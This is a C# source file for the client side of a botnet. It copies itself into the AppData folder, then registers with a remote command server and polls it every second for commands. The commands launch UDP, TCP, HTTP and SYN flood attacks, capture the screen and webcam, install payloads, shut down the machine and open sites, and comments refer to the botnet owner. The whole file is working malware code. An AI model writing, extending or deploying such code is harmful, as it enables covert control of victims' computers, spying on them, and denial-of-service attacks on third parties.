using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Drawing.Printing;

using UITimer = System.Threading.Timer;

namespace Reciever
{
    class Program
    {
        //Timer Declares
        static UITimer KeepAliveTimer;
        static UITimer Listener;
        static UITimer DTimer;
        //Global AppPath
        public static string AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        //Time holds ddos time in seconds
        static int Time;
        //bool for whether server should melt(selfdestruct after copying)
        static bool Melt = false;
        //bool for whether ddos is currently active
        public static bool DActive = false;
        //Should hold base64 encrypted skype name of botnet owner
        static string user = "%SKYPE%";

        static void Main(string[] args)
        {
            InstallMe();
            Functions.IO.UpdateMe();
            Connect();
            StartTimers();
            Console.ReadLine();
        }

        //Connect function adds bot to online list and creates bot directory if doesn't exist / Calls StartTimers if connection is successfull
        static bool Connect()
        {
            try
            {
                WebClient Connect = new WebClient();
                string Output = Connect.DownloadString("http://www.colaska.com/skype/connect?user=" + user + "&name=" + Environment.UserName);
                Connect.Dispose();
                return true;
            }

            catch (Exception e)
            {
                return false;
            }
        }

        static void StartTimers()
        {
            KeepAliveTimer = new UITimer(KeepAlive, 5, 300000, 300000);
            Listener = new UITimer(Listen, 5, 1000, 1000);
        }

        //Call back function for KeepAlive timer - keeps bot online
        static void KeepAlive(Object state)
        {
            Connect();
        }

        //Call back for listner timer - listens for commands
        static void Listen(Object state)
        {
            WebClient Listen = new WebClient();
            string Output = Listen.DownloadString("http://www.colaska.com/skype/listen?user=" + user + "&name=" + Environment.UserName);
            Listen.Dispose();
            string[] ParseOutput = Output.Split(':');
            switch (ParseOutput[0])
            {
                case "MESSAGE":
                    Functions.IO.Message(ParseOutput[1]);
                    break;

                case "SHUTDOWN":
                    ShutDown();
                    break;

                case "VISIT":
                    Visit(ParseOutput[1]);
                    break;

                case "INSTALL":
                    Functions.IO.Install(ParseOutput[1]);
                    break;

                case "UPDATE":
                    Update(ParseOutput[1]);
                    break;

                case "FRESH":
                    Functions.Sounds.Fresh();
                    break;

                case "SPEAK":
                    Functions.Sounds.Speak(ParseOutput[1]);
                    break;

                case "PRINT":
                    Print(ParseOutput[1]);
                    break;

                case "UDP":
                    Time = Convert.ToInt32(ParseOutput[2]);
                    Time = Time * 1000;
                    DTimer = new UITimer(DTimerCall, null, Time, Time);
                    Functions.DDoS.UDPStart(ParseOutput[1]);
                    break;

                case "TCP":
                    Time = Convert.ToInt32(ParseOutput[2]);
                    Time = Time * 1000;
                    DTimer = new UITimer(DTimerCall, null, Time, Time);
                    Functions.DDoS.TCPStart(ParseOutput[1]);
                    break;

                case "HTTP":
                    Time = Convert.ToInt32(ParseOutput[2]);
                    Time = Time * 1000;
                    DTimer = new UITimer(DTimerCall, null, Time, Time);
                    Functions.DDoS.HTTPStart(ParseOutput[1]);
                    break;

                case "SYN":
                    Time = Convert.ToInt32(ParseOutput[2]);
                    Time = Time * 1000;
                    DTimer = new UITimer(DTimerCall, null, Time, Time);
                    Functions.DDoS.StartSYN(ParseOutput[1]);
                    break;

                case "SCREENSHOT":
                    Functions.Image.Screenshot();
                    break;

                case "BOTKILLER":
                    break;

                case "UNINSTALL":
                    Uninstall();
                    break;

                case "WEBCAM":
                    Functions.Webcam.CaptureCam();
                    break;

                case "BEEP":
                    Functions.Sounds.Beep(ParseOutput[1], ParseOutput[2]);
                    break;

                case "STOP":
                    DActive = false;
                    break;
            }
        }

        //=======================================================================================================================================
        //=======================================================================================================================================
        //=======================================================================================================================================

       

        static void ShutDown()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        static void Visit(string site)
        {
            Process.Start(site);
        }



        static void Update(string link)
        {

        }

static void Print(string Text)
        {
            PrintDocument PDocument = new PrintDocument();
            PDocument.PrintPage += delegate(object Sender, PrintPageEventArgs e)
            {
                e.Graphics.DrawString(Text, new Font("Times New Roman", 12), new SolidBrush(Color.Black), new RectangleF(0, 0, PDocument.DefaultPageSettings.PrintableArea.Width, PDocument.DefaultPageSettings.PrintableArea.Height));
            };

            try
            {
                PDocument.Print();
            }

            catch (Exception e)
            {}
        }

        static void Uninstall()
        {
            Application.Exit();
        }

        static void InstallMe()
        {
            string ExePath = Application.ExecutablePath;
            string Name = System.AppDomain.CurrentDomain.FriendlyName;

            if (!ExePath.Contains("AppData"))
            {
                if (!File.Exists(AppPath + "\\" + Name))
                {
                    File.Copy(Application.ExecutablePath, AppPath + "\\" + Name);
                    Process.Start(AppPath + "\\" + Name);
                    Application.Exit();
                }
            }
        }

        static void DTimerCall(object obj)
        {
            DActive = false;
            DTimer.Dispose();
        }

  



        

    }
}